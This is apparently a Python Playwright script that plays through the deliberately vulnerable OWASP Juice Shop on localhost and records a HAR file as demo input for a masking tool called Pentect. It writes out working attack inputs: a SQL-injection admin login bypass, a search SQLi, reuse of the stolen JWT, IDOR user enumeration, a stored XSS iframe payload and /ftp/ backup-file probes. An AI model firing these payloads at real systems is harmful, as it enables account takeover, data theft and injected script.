"""Play OWASP Juice Shop like a pentester and save a realistic HAR.

Mixes legitimate usage (login, browse, search, basket) with several well-known
Juice Shop vulnerability triggers so that the captured HAR resembles what a
real pentester's proxy log would contain:

  V1. SQL-injection login with  admin@juice-sh.op'--  -> JWT bypass
  V2. Search SQLi  /rest/products/search?q='))--     -> DB error disclosure
  V3. JWT reuse / identity inspection via /rest/user/whoami
  V4. Feedback XSS payload (stored comment)
  V5. Directory listing probe  /ftp/
  V6. IDOR probe  /api/Users/1  (authorised user enumeration)

The Host header is rewritten to juice-shop.local on every request so the HAR
contains an internal-looking hostname -- the exact thing Pentect should mask.

Usage:
    python demo/juice/capture.py       ->  demo/juice/captured.har
"""
from __future__ import annotations

import json
from pathlib import Path

from playwright.sync_api import sync_playwright


TARGET = "http://localhost:3030"
FAKE_HOST = "juice-shop.local"
OUT = Path(__file__).parent / "captured.har"


def _route(route):
    headers = dict(route.request.headers)
    headers["host"] = FAKE_HOST
    route.continue_(headers=headers)


def _banner(msg: str) -> None:
    print(f"\n>>> {msg}")


def main() -> None:
    with sync_playwright() as p:
        browser = p.chromium.launch()
        context = browser.new_context(
            record_har_path=str(OUT),
            record_har_content="embed",
            ignore_https_errors=True,
        )
        context.route("**/*", _route)
        page = context.new_page()
        api = context.request  # for direct HTTP calls, same cookies/har

        # --- 0. home --------------------------------------------------------
        _banner("home page")
        page.goto(TARGET, wait_until="domcontentloaded", timeout=30000)
        page.wait_for_timeout(1500)

        # --- 1. legitimate-looking browsing --------------------------------
        _banner("browse products (REST)")
        api.get(f"{TARGET}/rest/products/search?q=apple")
        api.get(f"{TARGET}/api/Products/1")
        api.get(f"{TARGET}/api/Products/2")

        # --- V1. SQL-injection login ---------------------------------------
        _banner("V1: SQLi login (admin@juice-sh.op'--)")
        r = api.post(
            f"{TARGET}/rest/user/login",
            data=json.dumps({"email": "admin@juice-sh.op'--", "password": "anything"}),
            headers={"Content-Type": "application/json"},
        )
        jwt = None
        try:
            body = r.json()
            jwt = body.get("authentication", {}).get("token")
            uid = body.get("authentication", {}).get("umail")
            print(f"    got token={bool(jwt)} umail={uid}")
        except Exception:
            print("    (login response not JSON)")

        auth_hdr = {"Authorization": f"Bearer {jwt}"} if jwt else {}

        # --- V3. whoami with stolen JWT ------------------------------------
        _banner("V3: /rest/user/whoami with admin JWT")
        api.get(f"{TARGET}/rest/user/whoami", headers=auth_hdr)

        # --- 2. basket (authenticated) -------------------------------------
        _banner("view basket as admin")
        api.get(f"{TARGET}/api/Baskets/1", headers=auth_hdr)

        # --- V2. search SQLi -----------------------------------------------
        _banner("V2: search SQLi  q='))--")
        api.get(f"{TARGET}/rest/products/search?q=%27%29%29--")

        # --- V6. IDOR: enumerate users -------------------------------------
        _banner("V6: IDOR probe /api/Users/{1..3}")
        for uid in (1, 2, 3):
            api.get(f"{TARGET}/api/Users/{uid}", headers=auth_hdr)

        # --- V4. stored XSS in feedback ------------------------------------
        _banner("V4: feedback with XSS payload")
        api.post(
            f"{TARGET}/api/Feedbacks",
            data=json.dumps({
                "comment": "<iframe src=\"javascript:alert(`xss`)\">",
                "rating": 1,
                "captchaId": 0,
                "captcha": "0",
            }),
            headers={"Content-Type": "application/json", **auth_hdr},
        )

        # --- V5. directory listing probe -----------------------------------
        _banner("V5: /ftp/ directory probe")
        api.get(f"{TARGET}/ftp/")
        api.get(f"{TARGET}/ftp/package.json.bak")

        # --- 3. legitimate-looking checkout attempt ------------------------
        _banner("checkout attempt")
        api.post(
            f"{TARGET}/api/BasketItems",
            data=json.dumps({"BasketId": "1", "ProductId": 1, "quantity": 1}),
            headers={"Content-Type": "application/json", **auth_hdr},
        )
        api.get(f"{TARGET}/rest/basket/1", headers=auth_hdr)

        # --- 4. one more benign page view so HAR isn't pure exploit --------
        _banner("visit /#/contact (UI)")
        try:
            page.goto(f"{TARGET}/#/contact", wait_until="networkidle", timeout=15000)
            page.wait_for_timeout(1200)
        except Exception:
            pass

        context.close()
        browser.close()

    # Post-process: rewrite localhost:3030 -> juice-shop.local so the HAR
    # looks like it was captured against an internal-hostname deployment.
    # This is what Pentect should detect and mask as INTERNAL_URL in the demo.
    _banner("post-processing HAR (localhost:3030 -> juice-shop.local)")
    raw = OUT.read_text(encoding="utf-8")
    rewritten = (
        raw.replace("localhost:3030", FAKE_HOST)
           .replace("localhost%3A3030", FAKE_HOST)
    )
    OUT.write_text(rewritten, encoding="utf-8")

    size = OUT.stat().st_size
    print(f"\nwrote {OUT}  ({size/1024:.1f} KB)")


if __name__ == "__main__":
    main()
